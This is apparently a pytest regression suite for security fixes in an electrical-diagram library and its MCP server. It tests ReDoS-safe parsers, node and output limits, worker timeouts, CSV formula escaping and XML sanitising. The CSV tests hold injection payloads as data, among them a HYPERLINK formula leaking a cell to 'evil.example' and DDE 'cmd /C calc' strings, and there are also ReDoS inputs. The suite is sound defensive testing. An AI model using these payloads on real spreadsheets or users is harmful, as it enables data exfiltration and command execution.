"""Regression tests of the security fixes: linear parsers, public MCP limits and worker pool, CSV formula
injection, XML-illegal characters, deep documents."""

import copy
import csv
import io
import json
import sys
import time
import xml.dom.minidom

import pytest

from uniwire import exports
from uniwire.bom import bom_csv
from uniwire.llm import tools as T
from uniwire.resolve import MAX_DEPTH, UniwireError, load
from uniwire.units import MAX_QUANTITY_CHARS, parse_quantity

from .conftest import ROOT

EXAMPLE = ROOT / "examples" / "01_studio_apartment.uniwire.json"


def _doc(children, **extra):
    return {"uniwire": "1.0.0", "installation": {"earthing": "TT", "system": "1P+N", "un_V": 230},
            "sources": [{"type": "grid", "id": "S", "children": children}], **extra}


def _flat(n, label=None):
    return _doc([{"type": "breaker", **({"label": label} if label else {})} for _ in range(n)])


def _deep(n):
    node = {"type": "breaker"}
    for _ in range(n):
        node = {"type": "breaker", "children": [node]}
    return _doc([node])


def _fast(fn, *args, limit=0.05):
    t = time.perf_counter()
    try:
        fn(*args)
    except ValueError:
        pass
    return time.perf_counter() - t < limit


# ------------------------------------------------------------------ H1: linear parsers


@pytest.mark.parametrize("text, target, expected", [
    ("16 A", "A", 16), ("  2,5 mm² ", "mm2", 2.5), ("30mA", "A", 0.03), ("0,03 A", "mA", 30), ("1.5e3 W", "kW", 1.5),
    ("-5", "A", -5), ("4 KVA", "VA", 4000), ("16\nA", "A", 16), ("10 km", "m", 10000), ("12", "A", 12),
])
def test_quantity_formats_still_parse(text, target, expected):
    assert parse_quantity(text, target) == pytest.approx(expected)


@pytest.mark.parametrize("text", ["", "A16", "16 A\nB", "1.2.3", " ", "16 A x" + "y" * 80])
def test_quantity_rejects(text):
    with pytest.raises(ValueError):
        parse_quantity(text, "A")


@pytest.mark.parametrize("payload", [
    "1a" + " " * 100_000 + "\nx",  # quadratic with the former '.*' / '\s*$' overlap
    "1" * 100_000 + "x",
    "1 " + "a" * 100_000 + "\n",
    "1" + " " * 100_000 + "A" + "\t" * 100_000 + "x",
], ids=["blanks-newline", "digits", "unit-newline", "mixed-blanks"])
def test_quantity_adversarial_input_is_rejected_fast(payload):
    with pytest.raises(ValueError, match="too long"):
        parse_quantity(payload, "A")
    assert _fast(parse_quantity, payload, "A")


def test_quantity_blank_padding_is_stripped():
    assert parse_quantity(" " * 100_000 + "16 A" + "\t" * 100_000, "A") == 16
    assert _fast(parse_quantity, " " * 100_000 + "16 A" + "\t" * 100_000, "A")


def test_quantity_length_limit():
    assert parse_quantity("1" * MAX_QUANTITY_CHARS, "A") == float("1" * MAX_QUANTITY_CHARS)
    with pytest.raises(ValueError, match="too long"):
        parse_quantity("1" * (MAX_QUANTITY_CHARS + 1), "A")


def test_build_parsers_are_linear():
    from uniwire import build

    assert build._looks_like_ref("-Q1") and build._looks_like_ref("KM12a") and build._looks_like_ref("X1.2-3b")
    assert not build._looks_like_ref("Q 1") and not build._looks_like_ref("q1")
    assert build._cable("U1000R2V 3G2,5 25 m") == {"designation": "U1000R2V", "cores": "3G", "section_mm2": 2.5,
                                                    "length_m": "25"}
    assert build._rating("C16") == {"curve": "C", "in_A": 16.0}
    assert _fast(build._looks_like_ref, "A" + "1" * 100_000 + "!")
    assert build._REF_RE.fullmatch("A" + "1" * 100 + "!") is None
    assert _fast(build._REF_RE.fullmatch, "A" + "1" * 100_000 + "!")
    assert _fast(build._rating, "C" + "1" * 100_000 + "x")
    with pytest.raises(ValueError, match="too long"):
        build._cable("1" * 100_000)
    import re
    cable_len = re.compile(r"(?<!\d)(\d+(?:[.,]\d+)?)\s*m\b(?!m)")  # the search used by _cable
    assert _fast(cable_len.search, "1" * 100_000)


# ------------------------------------------------------------------ deep documents


# pydantic-core's recursion guard is shallower on Windows: a 100-level power tree is refused there (cleanly, see
# validation.too_deep_validator) although it validates elsewhere. Real installations are a few levels deep.
FINE_DEPTH = 30 if sys.platform == "win32" else 100


def test_deep_documents_give_a_clean_error():
    doc = _deep(FINE_DEPTH)
    assert "breaker" in T.describe(doc)  # used to fail with "Circular reference detected" around depth 150
    assert T.validate(doc)["valid"] is True
    for depth in (MAX_DEPTH, 5000):
        for fn in (T.validate, T.check, T.describe, T.normalize, T.bom, T.render):
            with pytest.raises(T.ToolError, match="nested too deeply"):
                fn(_deep(depth))
        with pytest.raises(UniwireError, match="nested too deeply"):
            load(_deep(depth))
    with pytest.raises(T.ToolError, match="nested too deeply"):
        T.apply_patch(_deep(MAX_DEPTH), [])


def test_deep_json_text_is_a_clean_error():
    text = '{"a":' * 100_000 + "1" + "}" * 100_000
    with pytest.raises(T.ToolError, match="too deeply"):
        T.validate(text)


@pytest.mark.skipif(sys.platform == "win32", reason="needs two 100-level trees that validate (pydantic guard on Windows)")
def test_patch_cannot_build_a_too_deep_document():
    doc = _deep(100)
    inner = doc["sources"][0]["children"][0]
    while inner.get("children"):
        inner = inner["children"][0]
    inner["id"] = "QX"
    deep_node = _deep(100)["sources"][0]["children"][0]  # each one is fine on its own
    assert T.validate(doc)["valid"] and T.validate(_doc([deep_node]))["valid"]
    res = T.apply_patch(doc, [{"op": "add", "parent": "QX", "node": deep_node}])
    assert res["ok"] is False and "nested too deeply" in res["errors"][0]["error"]


# ------------------------------------------------------------------ H2 / M1: public limits


@pytest.fixture
def public(monkeypatch):
    monkeypatch.setattr(T, "PUBLIC", True)


def test_public_node_limit(public, monkeypatch):
    assert T.validate(_flat(T.MAX_NODES - 1))["valid"]  # + the source node
    with pytest.raises(T.ToolError, match="nodes"):
        T.validate(_flat(T.MAX_NODES))
    devices = [{"type": "relay", "id": f"K{i}"} for i in range(10)]
    with pytest.raises(T.ToolError, match="nodes"):
        T.check(_doc([{"type": "breaker"} for _ in range(T.MAX_NODES - 5)], devices=devices))


def test_public_node_limit_counts_resolved_nodes(public, monkeypatch):
    monkeypatch.setattr(T, "_count_raw_nodes", lambda raw: 0)  # the count after resolution still applies
    with pytest.raises(T.ToolError, match="nodes"):
        T.render(_flat(T.MAX_NODES))


def test_public_sheet_and_output_limits(public, monkeypatch):
    doc = json.loads(EXAMPLE.read_text("utf-8"))
    monkeypatch.setattr(T, "MAX_SHEETS", 0)
    with pytest.raises(T.ToolError, match="too many sheets"):
        T.render(doc)
    monkeypatch.setattr(T, "MAX_SHEETS", 40)
    monkeypatch.setattr(T, "MAX_OUTPUT_BYTES", 1000)
    with pytest.raises(T.ToolError, match="output too large"):
        T.render(doc)
    with pytest.raises(T.ToolError, match="output too large"):
        T.render(doc, sheet=1)
    assert "pdf_url" in T.render(doc, format="pdf")  # public PDF: a link, nothing rendered on the server


def test_public_patch_limits(public, monkeypatch):
    doc = json.loads(EXAMPLE.read_text("utf-8"))
    op = {"op": "set", "id": "Q11", "path": "in_A", "value": 16}
    assert T.apply_patch(doc, [op] * T.MAX_PATCH_OPS)["ok"]
    with pytest.raises(T.ToolError, match="too many operations"):
        T.apply_patch(doc, [op] * (T.MAX_PATCH_OPS + 1))
    with pytest.raises(T.ToolError, match="too many operations"):
        T.apply_patch(doc, {"ops": [op] * (T.MAX_PATCH_OPS + 1)})
    monkeypatch.setattr(T, "MAX_DOCUMENT_CHARS", len(json.dumps(doc)) + 10)
    with pytest.raises(T.ToolError, match="patched document too large"):
        T.apply_patch(doc, [{"op": "set", "id": "Q11", "path": "label", "value": "x" * 100}])


def test_local_mode_is_unlimited(monkeypatch):
    monkeypatch.setattr(T, "MAX_NODES", 3)
    monkeypatch.setattr(T, "MAX_SHEETS", 0)
    assert T.render(str(EXAMPLE))["sheets"] >= 1


@pytest.fixture(scope="module")
def pool():
    from uniwire.llm.sandbox import WorkerPool

    p = WorkerPool(size=1, timeout=3, queue_timeout=1)
    yield p
    p.close()


def test_pool_runs_tools_and_reports_clean_errors(pool):
    doc = json.loads(EXAMPLE.read_text("utf-8"))
    assert pool.call("validate", {"document": doc})["valid"] is True
    with pytest.raises(T.ToolError, match="file paths are disabled"):  # the worker runs in public mode
        pool.call("validate", {"document": str(EXAMPLE)})
    with pytest.raises(T.ToolError, match="nodes"):
        pool.call("validate", {"document": _flat(T.MAX_NODES)})
    with pytest.raises(T.ToolError) as e:
        pool.call("render", {"document": doc, "kind": "nope"})
    assert "Traceback" not in str(e.value)


def test_pool_timeout_kills_the_worker(pool):
    slow = _flat(5, "x" * 20_000)  # long labels: about a minute of layout work in-process
    w = pool._idle.queue[0]
    t = time.perf_counter()
    with pytest.raises(T.ToolError, match="timed out"):
        pool.call("render", {"document": slow})
    assert time.perf_counter() - t < 6
    w.proc.join(2)
    assert not w.proc.is_alive()  # really terminated, not abandoned
    assert pool.call("validate", {"document": _flat(3)})["valid"] is True  # a fresh worker took over


def test_pool_busy(pool):
    import threading

    slow = _flat(5, "x" * 20_000)
    errors = []

    def go():
        try:
            pool.call("render", {"document": slow})
        except T.ToolError as e:
            errors.append(str(e))
    threads = [threading.Thread(target=go) for _ in range(2)]
    for th in threads:
        th.start()
    for th in threads:
        th.join()
    assert any("busy" in m for m in errors) and any("timed out" in m for m in errors)


def test_server_uses_pool_for_document_tools(pool):
    pytest.importorskip("mcp")
    from uniwire.mcp_server import POOLED, _guard

    class Err(Exception):
        pass

    def render(document, kind="single-line"):  # never called: the pool runs uniwire.llm.tools.render
        raise AssertionError

    assert "render" in POOLED
    wrapped = _guard(render, Err, pool)
    with pytest.raises(Err, match="kind must be"):
        wrapped(_flat(2), kind="nope")
    assert "<svg" in wrapped(_flat(2))["svg"][0]


def test_mcp_main_refuses_http_without_sdk_support(monkeypatch, capsys):
    pytest.importorskip("mcp")
    from uniwire import mcp_server

    monkeypatch.setattr(mcp_server, "_http_supported", lambda: False)
    assert mcp_server.main(["--http"]) == 1
    assert "mcp>=2.0" in capsys.readouterr().err


def test_mcp_help_documents_limits(capsys):
    pytest.importorskip("mcp")
    from uniwire import mcp_server

    with pytest.raises(SystemExit):
        mcp_server.main(["--help"])
    out = capsys.readouterr().out
    assert "public mode" in out and str(T.MAX_NODES) in out and "--timeout" in out


# ------------------------------------------------------------------ L1: CSV formula injection


@pytest.mark.parametrize("value, safe", [
    ("-Q1", "-Q1"), ("=TD1+L2-Q3", "=TD1+L2-Q3"), ("-X1:PE", "-X1:PE"), ("-1.5", "-1.5"), ("+2e-3", "+2e-3"),
    ("-Q1 -Q2", "-Q1 -Q2"), ("Q1", "Q1"), ("", ""),
    ('=HYPERLINK("http://evil.example/?"&A1,"x")', '\'=HYPERLINK("http://evil.example/?"&A1,"x")'),
    ("+cmd|' /C calc'!A0", "'+cmd|' /C calc'!A0"), ("@SUM(1+1)*cmd|' /C calc'!A0", "'@SUM(1+1)*cmd|' /C calc'!A0"),
    ('-F0"><script>', '\'-F0"><script>'), ("\t=1+1", "'\t=1+1"), ("\r=1", "'\r=1"), ("-Q1 x", "'-Q1 x"),
])
def test_csv_cell(value, safe):
    assert exports.csv_cell(value) == safe


def _injected_doc():
    doc = _doc([{"type": "breaker", "id": "Q1", "ref": '-F0"><script>', "manufacturer": "=HYPERLINK(\"x\")",
                 "part_number": "@SUM(A1)", "children": [
                     {"type": "breaker", "id": "Q2", "ref": "-Q2", "manufacturer": "+cmd|' /C calc'!A0",
                      "part_number": "P1", "cable": {"cores": "3G", "section_mm2": 2.5, "ref": "=W1+x(1)",
                                                     "designation": "-1.5"}}]}])
    return load(doc)


def test_csv_writers_neutralise_formulas():
    doc = _injected_doc()
    for text, delim in ((bom_csv(doc), ";"), (exports.cables_csv(doc), ","), (exports.wires_csv(doc), ","),
                        (exports.markers_csv(doc), ",")):
        for row in csv.reader(io.StringIO(text), delimiter=delim):
            for cell in row:
                if cell[:1] in ("=", "+", "-", "@"):
                    assert exports._REF_CELL.fullmatch(cell) or exports._NUMBER_CELL.fullmatch(cell), cell
    text = bom_csv(doc)
    assert "'=HYPERLINK" in text and "'@SUM(A1)" in text and "'+cmd" in text
    assert '\'-F0""><script>' in text
    cables = exports.cables_csv(doc)
    assert "'=W1+x(1)" in cables and ",-1.5," in cables


# ------------------------------------------------------------------ L2: XML-illegal characters


BAD = "a\x00b\x0bc\ud800d￾\x1f"


def test_svg_is_well_formed_with_illegal_characters():
    from uniwire.render.svg import escape, quoteattr, xml_safe

    assert xml_safe(BAD) == "a�b�c�d��"
    assert xml_safe("tab\tnl\ncr\r") == "tab\tnl\ncr\r"
    assert "\x00" not in escape(BAD) and "\ud800" not in quoteattr(BAD)
    doc = json.loads(EXAMPLE.read_text("utf-8"))
    doc["meta"]["title"] = BAD
    first = doc["sources"][0]["children"][0]
    first["label"] = BAD
    for kind in ("single-line", "multi-line"):
        for svg in T.render(copy.deepcopy(doc), kind=kind)["svg"]:
            xml.dom.minidom.parseString(svg.encode("utf-8"))  # well-formed, encodable
            assert "�" in svg


def test_pdf_and_csv_accept_illegal_characters():
    pytest.importorskip("reportlab")
    doc = json.loads(EXAMPLE.read_text("utf-8"))
    doc["meta"]["title"] = BAD
    doc["sources"][0]["children"][0]["label"] = BAD
    assert T.render(doc, format="pdf")["pdf_base64"]
    d = load(_doc([{"type": "breaker", "id": "Q1", "manufacturer": BAD, "part_number": BAD,
                    "cable": {"cores": "3G", "section_mm2": 2.5, "ref": BAD}}]))
    for text in (bom_csv(d), exports.cables_csv(d)):
        text.encode("utf-8")
        assert "\x00" not in text and "�" in text
